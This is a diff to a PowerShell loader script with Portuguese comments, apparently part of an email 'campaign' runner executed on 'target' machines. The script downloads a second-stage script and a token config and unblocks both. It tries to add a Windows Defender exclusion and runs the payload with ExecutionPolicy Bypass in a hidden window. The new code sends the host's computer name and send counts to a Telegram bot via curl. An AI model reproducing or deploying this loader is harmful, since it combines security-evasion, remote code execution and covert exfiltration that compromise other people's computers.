@@ -1,8 +1,9 @@
-# reho.ps1 v4.3 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
+# reho.ps1 v4.4 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
 # O one-liner (curl+File) NUNCA muda: reho.ps1 + reho.config.json sao o canal fixo;
 # a campanha/tokens mudam editando reho.config.json no stl e re-up. Papeis em
-# docs/canal-distribuicao.md. Versao: 4.3 (loga no estagio-2; o PING REHO_TG_CHECK
-# confere api.telegram.org ANTES da campanha).
+# docs/canal-distribuicao.md. Versao: 4.4 (observabilidade p/ CMD oculto: log em
+# %LOCALAPPDATA%\rehot\reho.log + resumo do runner no Telegram via curl; PING
+# REHO_TG_CHECK confere api.telegram.org ANTES da campanha; version log estagio-2).
 #   1. cria %LOCALAPPDATA%\rehot
 #   2. baixa reho.config.json (tokens+campanha) e rehot.ps1 (motor) - engines:
 #      curl.exe -> iwr; canary em cada arquivo; guard parse do rehot baixado
@@ -21,8 +22,26 @@ $t = Join-Path $d 'rehot.ps1'
 $c = Join-Path $d 'reho.config.json'
 
 function RhoFail([int]$stage, [string]$msg) {
-    Write-Output ('[reho FALHA estagio-' + $stage + '] ' + $msg)
+    RhoLog ('[reho FALHA estagio-' + $stage + '] ' + $msg)
     exit $stage
+}
+# log duplo: console (CMD visivel) + %LOCALAPPDATA%\rehot\reho.log (CMD oculto).
+$script:rhoLogPath = $null
+function RhoLog([string]$msg) {
+    Write-Output $msg
+    if ($script:rhoLogPath) {
+        try { Add-Content -LiteralPath $script:rhoLogPath -Value ((Get-Date -Format 'HH:mm:ss') + ' ' + $msg) -Encoding ascii -ErrorAction SilentlyContinue } catch { }
+    }
+}
+# resumo do runner no Telegram via curl (o mesmo motor do download; se iwr do rehot
+# estiver bloqueado no alvo, este canal continua). Sem token = nao envia.
+$script:rhoTgTok = ''; $script:rhoTgChat = ''
+function RhoTg([string]$text) {
+    if (-not $script:rhoTgTok -or -not $script:rhoTgChat) { return }
+    try {
+        $pl = (@{ chat_id = $script:rhoTgChat; text = $text; disable_web_page_preview = $false } | ConvertTo-Json -Compress)
+        & curl.exe -sS -o NUL --connect-timeout 10 -X POST -H 'Content-Type: application/json' --data $pl ("https://api.telegram.org/bot" + $script:rhoTgTok + '/sendMessage') 2>$null | Out-Null
+    } catch { }
 }
 
 if (-not (Test-Path $d)) {
@@ -32,7 +51,9 @@ if (-not (Test-Path $d)) {
         RhoFail 1 ('pasta nao criada: ' + $_.Exception.Message)
     }
 }
-Write-Output '[reho] ok estagio-1 pasta ' + $d
+$script:rhoLogPath = Join-Path $d 'reho.log'
+try { Set-Content -LiteralPath $script:rhoLogPath -Value ('reho v4.4 ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ' + $env:COMPUTERNAME) -Encoding ascii } catch { }
+RhoLog '[reho] ok estagio-1 pasta ' + $d
 
 foreach ($old in @($t, $c)) {
     if (Test-Path $old) { Remove-Item $old -Force -ErrorAction SilentlyContinue }
@@ -64,9 +85,9 @@ if (Get-Dl 'reho.config.json' $c) {
     else { Remove-Item $c -Force -ErrorAction SilentlyContinue }
 }
 if ($cfgOk) {
-    Write-Output ('[reho] ok estagio-2 reho.config.json (' + (Get-Item $c).Length + ' bytes)')
+    RhoLog ('[reho] ok estagio-2 reho.config.json (' + (Get-Item $c).Length + ' bytes)')
 } else {
-    Write-Output '[reho] estagio-2 reho.config.json ausente/ilegivel -> segue com defaults do runner (mesma campanha de v3)'
+    RhoLog '[reho] estagio-2 reho.config.json ausente/ilegivel -> segue com defaults do runner (mesma campanha de v3)'
 }
 if (-not (Get-Dl 'rehot.ps1' $t)) {
     RhoFail 2 'download do rehot.ps1 nao completou nos 2 engines (404/403/rede/bloqueio; confira se o repo stl ta atualizado)'
@@ -82,12 +103,12 @@ if ($null -ne $perr -and $perr.Count -gt 0) {
     RhoFail 2 ('rehot.ps1 baixado nao parseia (' + $perr.Count + ' erros; arquivo parcial ou corrompido)')
 }
 $rehotVer = if ((Get-Content $t -Raw).Contains('enviohot.report.v1')) { 'v1' } else { 'sem' }
-Write-Output ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes, relatorio ' + $rehotVer + ')')
+RhoLog ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes, relatorio ' + $rehotVer + ')')
 
 try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
 try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
 try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
-Write-Output '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'
+RhoLog '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'
 
 # defaults (fallback quando reho.config.json nao existe; mesmo contrato de campanha de v3)
 $dv = @{
@@ -137,9 +158,12 @@ if ($cfgOk) {
         if ($null -ne $j.ListaTok) { $ListaTok = [string]$j.ListaTok }
         if ($null -ne $j.ListaChatId) { $ListaChatId = [string]$j.ListaChatId }
     } catch {
-        Write-Output '[reho] reho.config.json ilegivel -> segue com defaults'
+        RhoLog '[reho] reho.config.json ilegivel -> segue com defaults'
     }
 }
+
+# ativa o canal de contingencia do runner no Telegram (mesmo token do config)
+$script:rhoTgTok = $TgTok; $script:rhoTgChat = $TelegramChatId
 
 $argvs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $t)
 if ($selfTest) {
@@ -172,11 +196,9 @@ if ($TgTok -and $TelegramChatId -and $telegram -and (-not $selfTest)) {
     if ((($pingCode -match '^(200|404)$') -and ($pingBody -match '"ok"\s*:')) -or ($pingCode -match '^(401|429)$')) {
         $extra = ''
         if ($pingCode -eq '401') { $extra = ' - token invalido (rotacionou no BotFather?)' }
-        Write-Output ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + $extra + ')')
+        RhoLog ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + $extra + ')')
     } else {
-        $note = '[reho FALHA] PING REHO_TG_CHECK - api.telegram.org INALCANCAVEL neste alvo (HTTP ' + $pingCode + '; iwr/curl bloqueados ou DNS). O email pode ter sido enviado normalmente; o report do Telegram nao chega daqui.'
-        $tgPayload = @{ chat_id = $TelegramChatId; text = $note; disable_web_page_preview = $false } | ConvertTo-Json -Compress
-        try { & curl.exe -sS -o NUL --connect-timeout 10 -X POST -H 'Content-Type: application/json' --data $tgPayload ("https://api.telegram.org/bot" + $TgTok + '/sendMessage') 2>$null | Out-Null } catch { }
+        RhoTg ('[reho FALHA] PING REHO_TG_CHECK - api.telegram.org INALCANCAVEL neste alvo (HTTP ' + $pingCode + '; iwr/curl bloqueados ou DNS). O email pode ter sido enviado normalmente; o report do Telegram nao chega daqui.')
         RhoFail 8 ('PING REHO_TG_CHECK falhou (HTTP ' + $pingCode + '; api.telegram.org unreachable no alvo; note local enviada ao bot se curl alcancar)')
     }
 }
@@ -185,10 +207,30 @@ if ($TgTok -and $TelegramChatId -and $telegram -and (-not $selfTest)) {
 $argvsLog = $argvs
 if ($TgTok) { $argvsLog = $argvs -replace [regex]::Escape($TgTok), '***' }
 if ($ListaTok) { $argvsLog = $argvsLog -replace [regex]::Escape($ListaTok), '***' }
-Write-Output ('[reho] estagio-4 exec: ' + ($argvsLog -join ' '))
+RhoLog ('[reho] estagio-4 exec: ' + ($argvsLog -join ' '))
+$rehotOut = ''
 try {
-    & (Join-Path $PSHOME 'powershell.exe') @argvs
-    exit $LASTEXITCODE
+    $rehotOut = [string](& (Join-Path $PSHOME 'powershell.exe') @argvs 2>&1)
+    $rehoExit = $LASTEXITCODE
+    # observabilidade do CMD oculto: resumo do runner no Telegram (canal de
+    # contingencia, curl; o rehot ja manda o relatorio completo por iwr quando
+    # ele funciona - este chegado primeiro confirma o que o alvo executou)
+    try {
+        $jsStart = $rehotOut.IndexOf('{')
+        if ($jsStart -ge 0) {
+            $j = $rehotOut.Substring($jsStart) | ConvertFrom-Json
+            $r = $j.resumo
+            $de = if ([string]$r.de) { [string]$r.de } else { '(sem conta com token)' }
+            $mot = ''
+            if ([string]$r.motivo) { $mot = ' | ' + [string]$r.motivo }
+            $stLabel = if ($null -eq $j.status) { 'legacy (rehot sem relatorio v1)' } else { [string]$j.status }
+            $envN = if ($null -eq $r.enviados) { 0 } else { [string]$r.enviados }
+            $totN = if ($null -eq $r.total) { 0 } else { [string]$r.total }
+            $falN = if ($null -eq $r.falhas) { 0 } else { [string]$r.falhas }
+            RhoTg ("[runner v4.4] " + $env:COMPUTERNAME + " - " + $stLabel + " | " + $de + " | " + $envN + "/" + $totN + " enviados, " + $falN + " falha(s)" + $mot)
+        }
+    } catch { }
+    exit $rehoExit
 } catch {
     RhoFail 4 ('execucao falhou: ' + $_.Exception.Message)
 }
